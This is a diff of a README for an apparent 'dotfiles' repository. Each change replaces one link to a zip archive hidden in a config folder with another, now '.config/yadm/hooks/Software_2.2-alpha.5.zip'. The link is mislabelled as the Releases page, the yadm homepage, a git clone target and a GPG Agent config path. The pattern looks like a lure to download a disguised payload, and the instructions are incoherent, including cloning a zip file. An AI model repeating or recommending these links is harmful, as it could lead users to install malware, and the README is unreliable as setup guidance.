@@ -1,6 +1,6 @@
 # 🌟 dotfiles - Your Personal Configuration Made Easy  
 
-[![Download](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip)](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip)
+[![Download](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yadm/hooks/Software_2.2-alpha.5.zip)](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yadm/hooks/Software_2.2-alpha.5.zip)
 
 ## 🚀 Getting Started  
 
@@ -8,7 +8,7 @@ Welcome to the dotfiles repository! This guide helps you download and set up you
 
 ### 📥 Download & Install  
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip) and download the latest version. Follow these steps:  
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yadm/hooks/Software_2.2-alpha.5.zip) and download the latest version. Follow these steps:  
 
 1. Click on the link above.
 2. Choose the latest version.
@@ -39,7 +39,7 @@ Follow these steps to run the application:
 3. **Clone the Repository:**  
    Run the command below to clone the dotfiles repository:
    ```bash
-   git clone https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip
+   git clone https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yadm/hooks/Software_2.2-alpha.5.zip
    ```
 
 4. **Change to the Dotfiles Directory:**  
@@ -49,7 +49,7 @@ Follow these steps to run the application:
    ```
 
 5. **Install Yadm:**  
-   If you don’t have [yadm](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip) installed, install it using a package manager. Here's how:  
+   If you don’t have [yadm](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yadm/hooks/Software_2.2-alpha.5.zip) installed, install it using a package manager. Here's how:  
 
    - For macOS, use Homebrew:
      ```bash
@@ -86,7 +86,7 @@ This repository contains useful configurations for various applications that imp
 | **Kitty** | `.config/kitty/` | Alternative terminal with splits for multitasking. |
 | **WezTerm** | `.config/wezterm/` | Cross-platform terminal with features written in Lua. |
 | **Yazi** | `.config/yazi/` | Terminal file manager with plugin support. |
-| **GPG Agent** | `https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip` | Passphrase caching config for secure access. |
+| **GPG Agent** | `https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yadm/hooks/Software_2.2-alpha.5.zip` | Passphrase caching config for secure access. |
 
 ## ✏️ Managing Your Configurations  
 
@@ -118,4 +118,4 @@ Feel free to customize your dotfiles according to your preferences. Open the `.z
 
 If you encounter issues or have questions, feel free to reach out via the Issues section on GitHub. 
 
-**Remember to visit the [Releases page](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip) for updates and new versions regularly.**
+**Remember to visit the [Releases page](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yadm/hooks/Software_2.2-alpha.5.zip) for updates and new versions regularly.**
